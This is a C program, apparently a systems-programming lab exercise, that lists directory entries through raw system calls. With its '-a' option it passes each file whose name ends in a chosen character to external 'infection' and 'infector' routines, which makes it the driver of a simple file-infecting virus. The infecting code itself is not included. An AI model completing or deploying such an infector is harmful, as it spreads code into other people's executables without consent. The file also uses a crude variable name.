#include "util.h"


#define SYS_EXIT 1
#define SYS_READ 3
#define SYS_WRITE 4
#define SYS_OPEN 5
#define SYS_CLOSE 6
#define SYS_SEEK 19
#define SYS_GETDENTS 141

#define O_RDONLY 0
#define O_WRONLY 1
#define O_RDRW 2
#define O_CREAT 64


#define SEEK_SET 0
#define SEEK_CUR 1
#define SEEK_END 2

#define STDOUT 1
#define STDIN 0
#define STDERR 2

#define BUFF_SIZE 8192

extern int system_call();
extern void infector();
extern void infection();

extern int code_start();
extern int code_end();

typedef struct ent {
    int inode;
    int offset;
    short len;
    char buf[];
} ent;

int _inDebug = 0;

int readWrite(int OP_CODE,int _file, char * buffer,int _size){
    int _ans=system_call(OP_CODE,_file,buffer,_size);
    if (_inDebug==0)
        return _ans;
    else{
        system_call(SYS_WRITE,STDERR,"\n",1);
        system_call(SYS_WRITE,STDERR,"OP Code: ",9);
        system_call(SYS_WRITE,STDERR,itoa(OP_CODE),strlen(itoa(OP_CODE)));
        system_call(SYS_WRITE,STDERR," Returned: ",11);
        system_call(SYS_WRITE,STDERR,itoa(_ans),strlen(itoa(_ans)));
        system_call(SYS_WRITE,STDERR,"\n",1);
        return _ans;
    }
}

int openCall(int OP_CODE,char * _path, int access,int permission){
    int _ans=system_call(OP_CODE,_path,access,permission);
    if (_inDebug==0)
        return _ans;
    else{
        system_call(SYS_WRITE,STDERR,"\n",1);
        system_call(SYS_WRITE,STDERR,"OP Code: ",9);
        system_call(SYS_WRITE,STDERR,itoa(OP_CODE),strlen(itoa(OP_CODE)));
        system_call(SYS_WRITE,STDERR," Returned: ",11);
        system_call(SYS_WRITE,STDERR,itoa(_ans),strlen(itoa(_ans)));
        system_call(SYS_WRITE,STDERR,"\n",1);
        return _ans;
    }
}




int main (int argc , char* argv[], char* envp[])
{
    char buf[BUFF_SIZE],d_type;
    ent * _entPointer;
    char * _path=".", *_name, *_infect;
    int _fileDisc,_count,i,_bpos,_filter=0, _beAbitch=0;
        
    for (i=1;i<argc;i++){
	/*checking for "-i FileName" struct*/  
	if (strcmp(argv[i],"-s")==0){
            _name=argv[i+1];
            _filter=1;
            i++; /*jumping i over the suffix name in order not to mix with the key*/
	}
	else if (strcmp(argv[i],"-p")==0){
            _path=argv[i+1];
            i++; /*jumping i over the suffix name in order not to mix with the key*/
	}
	else if (strcmp(argv[i],"-a")==0){
            _infect=argv[i+1];
            _beAbitch=1;
            i++; /*jumping i over the suffix name in order not to mix with the key*/
	}
        else if (strcmp(argv[i],"-d")==0) /* checks if we are in debug*/
            _inDebug=1;
    }
    
    readWrite(SYS_WRITE,STDOUT,"code start: ",strlen("code start: "));
    readWrite(SYS_WRITE,STDOUT,itoa((int)code_start),strlen(itoa((int)code_start)));
    system_call(SYS_WRITE,STDOUT,"\n",1);
    
    readWrite(SYS_WRITE,STDOUT,"code end: ",strlen("code end: "));
    readWrite(SYS_WRITE,STDOUT,itoa((int)code_end),strlen(itoa((int)code_end)));
    system_call(SYS_WRITE,STDOUT,"\n",1);
    
    if((_fileDisc=openCall(SYS_OPEN,_path,O_RDONLY,0777))<0)
        return 0x55;
    _count= readWrite(SYS_GETDENTS,_fileDisc,buf,BUFF_SIZE);
    if (_inDebug){
        system_call(SYS_WRITE,STDERR," arguments \n", 12);
        for (i = 0 ; i < argc ; i++){
            system_call(SYS_WRITE,STDERR,"argv[", 5);
            
            system_call(SYS_WRITE,STDERR,itoa(i),strlen(itoa(i)));
            system_call(SYS_WRITE,STDERR,"] = ",4);
            system_call(SYS_WRITE,STDERR,argv[i],strlen(argv[i]));
            system_call(SYS_WRITE,STDERR,"\n",1);
        }
    }
    
    for (_bpos=0; _bpos<_count;){
        _entPointer=(ent *) (buf + _bpos);
        d_type = *(buf + _bpos + _entPointer->len - 1);
        if((_filter==0 || *_name==_entPointer->buf[strlen(_entPointer->buf)-1])&& _beAbitch==0){
            if ((readWrite(SYS_WRITE,STDOUT,_entPointer->buf,strlen(_entPointer->buf)))<0)
            {
                return 0x55;
            }
            readWrite(SYS_WRITE,STDOUT," type of file is: ",strlen(" type of file is: "));
            readWrite(SYS_WRITE,STDOUT,itoa(d_type),strlen(itoa(d_type)));
            system_call(SYS_WRITE,STDOUT,"\n",1);
        }
        if (_inDebug){
            system_call(SYS_WRITE,STDERR,"File name: ",strlen("File name: "));
            system_call(SYS_WRITE,STDERR,_entPointer->buf,strlen(_entPointer->buf));
            system_call(SYS_WRITE,STDERR," File length: ",strlen(" File length: "));
            system_call(SYS_WRITE,STDERR,itoa(_entPointer->len),strlen(itoa(_entPointer->len)));
            system_call(SYS_WRITE,STDERR,"\n",1);
        }
        if(_beAbitch){
            if (*_infect==_entPointer->buf[strlen(_entPointer->buf)-1]){
                if ((readWrite(SYS_WRITE,STDOUT,_entPointer->buf,strlen(_entPointer->buf)))<0)
                    {
                return 0x55;
                }
                system_call(SYS_WRITE,STDOUT,"\n",1);
                infection();
                infector(_entPointer->buf);
            }
        }
        _bpos += _entPointer->len;
        
    }

    
    
    
    return 0;
}